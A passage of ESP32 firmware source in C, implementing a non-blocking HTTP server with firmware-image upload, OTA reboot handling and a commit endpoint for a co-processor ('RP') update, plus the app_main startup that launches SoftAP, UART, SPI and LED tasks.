    else if (http_path_is(path, "/rpcommit"))
    {
        if (!rp_image_ready)
        {
            http_reply_text(conn, "409 Conflict", "no RP image staged, upload one to /rpimage first\n");
        }
        else
        {
            rp_commit_frames_left = SPI_BENCH_ARM_FRAMES;
            http_reply_text(conn, "200 OK", "commit requested, the RP applies it and reboots\n");
        }
    }
    else if (http_path_is(path, "/favicon.ico"))
    {
        http_reply_no_content(conn, NULL);
    }
    else
    {
        http_reply(conn, "404 Not Found", HTTP_TEXT_HTML, NULL, "<h1>404 Not Found</h1>", 22);
    }
}

static void http_handle_recv(http_conn_t *conn)
{
    size_t room = sizeof(conn->req) - 1 - conn->req_len;
    if (room == 0)
    {
        http_conn_close(conn);
        return;
    }

    int n = recv(conn->fd, conn->req + conn->req_len, room, 0);
    if (n == 0)
    {
        http_conn_close(conn);
        return;
    }

    if (n < 0)
    {
        if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
        {
            return;
        }

        http_conn_close(conn);
        return;
    }

    conn->req_len += (size_t)n;
    conn->req[conn->req_len] = '\0';

    char *split = strstr(conn->req, "\r\n\r\n");
    if (split == NULL)
    {
        if (conn->req_len + 1 >= sizeof(conn->req))
        {
            http_reply_text(conn, "431 Request Header Fields Too Large", "headers too large\n");
            conn->state = HTTP_CONN_SEND;
            conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
        }

        return;
    }

    const char *body = split + 4;
    size_t body_len = conn->req_len - (size_t)(body - conn->req);

    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
    http_dispatch(conn, body, body_len);
}

static void http_handle_body(http_conn_t *conn)
{
    size_t remaining = conn->body_expected - conn->body_received;
    size_t want = remaining < sizeof(conn->req) ? remaining : sizeof(conn->req);

    int n = recv(conn->fd, conn->req, want, 0);
    if (n == 0)
    {
        http_body_fail(conn, "the connection closed before the image was complete");
        return;
    }

    if (n < 0)
    {
        if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
        {
            return;
        }

        http_body_fail(conn, "socket error while receiving the image");
        return;
    }

    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
    http_body_consume(conn, (const uint8_t *)conn->req, (size_t)n);
}

static void http_handle_send(http_conn_t *conn)
{
    while (conn->resp_sent < conn->resp_len)
    {
        int n = send(conn->fd, conn->resp + conn->resp_sent, conn->resp_len - conn->resp_sent, 0);
        if (n > 0)
        {
            conn->resp_sent += (size_t)n;
            continue;
        }

        if (n < 0 && (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR))
        {
            return;
        }

        http_conn_close(conn);
        return;
    }

    if (conn->send_left == 0)
    {
        http_conn_close(conn);
        return;
    }

    size_t chunk = conn->send_left < sizeof(conn->resp) ? conn->send_left : sizeof(conn->resp);

    memcpy(conn->resp, conn->send_ptr, chunk);

    conn->send_ptr += chunk;
    conn->send_left -= chunk;

    conn->resp_len = chunk;
    conn->resp_sent = 0;
    conn->deadline_ms = http_now_ms() + HTTP_SEND_TIMEOUT_MS;
}

static http_conn_t *http_conn_alloc(void)
{
    for (int i = 0; i < HTTP_MAX_CONN; ++i)
    {
        if (http_conns[i].state == HTTP_CONN_FREE)
        {
            return &http_conns[i];
        }
    }

    return NULL;
}

static void http_accept(int listen_fd)
{
    struct sockaddr_in source;
    socklen_t source_len = sizeof(source);

    int fd = accept(listen_fd, (struct sockaddr *)&source, &source_len);
    if (fd < 0)
    {
        return;
    }

    http_conn_t *conn = http_conn_alloc();
    if (conn == NULL)
    {
        stats.http_rejected++;
        close(fd);
        return;
    }

    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    int one = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));

    conn->fd = fd;
    conn->send_ptr = NULL;
    conn->send_left = 0;
    conn->state = HTTP_CONN_RECV;
    conn->req_len = 0;
    conn->resp_len = 0;
    conn->resp_sent = 0;
    conn->deadline_ms = http_now_ms() + HTTP_RECV_TIMEOUT_MS;
}

static void http_server_task(void *arg)
{
    (void)arg;

    for (int i = 0; i < HTTP_MAX_CONN; ++i)
    {
        http_conns[i].fd = -1;
        http_conns[i].send_ptr = NULL;
        http_conns[i].send_left = 0;
        http_conns[i].state = HTTP_CONN_FREE;
    }

    int listen_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_fd < 0)
    {
        ESP_LOGE(HTTP_TAG, "socket() failed: %d", errno);
        vTaskDelete(NULL);
        return;
    }

    int yes = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));

    struct sockaddr_in addr = {
        .sin_family = AF_INET, .sin_port = htons(HTTP_PORT), .sin_addr.s_addr = htonl(INADDR_ANY)};

    if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0)
    {
        ESP_LOGE(HTTP_TAG, "bind() failed: %d", errno);
        close(listen_fd);
        vTaskDelete(NULL);
        return;
    }

    if (listen(listen_fd, HTTP_LISTEN_BACKLOG) != 0)
    {
        ESP_LOGE(HTTP_TAG, "listen() failed: %d", errno);
        close(listen_fd);
        vTaskDelete(NULL);
        return;
    }

    int listen_flags = fcntl(listen_fd, F_GETFL, 0);
    fcntl(listen_fd, F_SETFL, listen_flags | O_NONBLOCK);

    ESP_LOGI(HTTP_TAG, "HTTP server listening on :%d", HTTP_PORT);

    while (1)
    {
        fd_set read_set;
        fd_set write_set;

        FD_ZERO(&read_set);
        FD_ZERO(&write_set);

        int max_fd = -1;
        bool has_free_slot = false;

        for (int i = 0; i < HTTP_MAX_CONN; ++i)
        {
            http_conn_t *conn = &http_conns[i];

            if (conn->state == HTTP_CONN_FREE)
            {
                has_free_slot = true;
                continue;
            }

            if (conn->state == HTTP_CONN_RECV || conn->state == HTTP_CONN_BODY)
            {
                FD_SET(conn->fd, &read_set);
            }
            else
            {
                FD_SET(conn->fd, &write_set);
            }

            max_fd = MAX(max_fd, conn->fd);
        }

        if (has_free_slot)
        {
            FD_SET(listen_fd, &read_set);
            max_fd = MAX(max_fd, listen_fd);
        }

        struct timeval timeout = {.tv_sec = 0, .tv_usec = HTTP_SELECT_TIMEOUT_MS * 1000};

        int ready = select(max_fd + 1, &read_set, &write_set, NULL, &timeout);
        if (ready < 0)
        {
            if (errno != EINTR)
            {
                ESP_LOGW(HTTP_TAG, "select() error: %d", errno);
                vTaskDelay(pdMS_TO_TICKS(10));
            }

            continue;
        }

        int64_t now = http_now_ms();

        for (int i = 0; i < HTTP_MAX_CONN; ++i)
        {
            http_conn_t *conn = &http_conns[i];

            if (conn->state == HTTP_CONN_RECV && FD_ISSET(conn->fd, &read_set))
            {
                http_handle_recv(conn);
            }
            else if (conn->state == HTTP_CONN_BODY && FD_ISSET(conn->fd, &read_set))
            {
                http_handle_body(conn);
            }
            else if (conn->state == HTTP_CONN_SEND && FD_ISSET(conn->fd, &write_set))
            {
                http_handle_send(conn);
            }

            if (conn->state != HTTP_CONN_FREE && now > conn->deadline_ms)
            {
                http_conn_close(conn);
            }
        }

        if (has_free_slot && FD_ISSET(listen_fd, &read_set))
        {
            http_accept(listen_fd);
        }

        app_validation_check_timeout(now);

        if (rp_commit_completed)
        {
            rp_commit_completed = false;
            rp_commit_pending = false;

            rp_image_invalidate();
            unlink(RP_IMAGE_PATH);
            ota_nvs_clear_rp_pending();

            ESP_LOGW(TAG, "RP update confirmed by the RP itself, staged image removed");
        }

        if (ota_reboot_pending)
        {
            bool flushing = false;

            for (int i = 0; i < HTTP_MAX_CONN; ++i)
            {
                if (http_conns[i].state == HTTP_CONN_SEND)
                {
                    flushing = true;
                    break;
                }
            }

            if (!flushing)
            {
                ESP_LOGW(HTTP_TAG, "rebooting into the freshly written image");
                vTaskDelay(pdMS_TO_TICKS(OTA_REBOOT_DELAY_MS));
                esp_restart();
            }
        }
    }
}

void app_main(void)
{
#ifndef ENABLE_DEBUG
    esp_log_level_set("*", ESP_LOG_NONE);
#endif

    snprintf(rp_status[0], RP_STATUS_MAX, "RP ALL OK");
    rp_status_index = 0;

    app_validation_init();

    xTaskCreate(spi_task, "spi_task", 4096, NULL, configMAX_PRIORITIES - 1, NULL);
    xTaskCreate(led_task, "led_task", 2048, NULL, tskIDLE_PRIORITY + 1, NULL);

    spiffs_init();

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND)
    {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    rp_image_restore_after_boot();

    wifi_init_softap();

    uart_init();

    xTaskCreate(http_server_task, "http_server_task", 4096 + 1024, NULL, tskIDLE_PRIORITY + 4, NULL);
    xTaskCreate(uart_rx_task, "uart_rx_task", 2560, NULL, tskIDLE_PRIORITY + 1, NULL);

    ESP_LOGI(TAG, "okhi main done");
}

#endif // __COM_ESP_H__
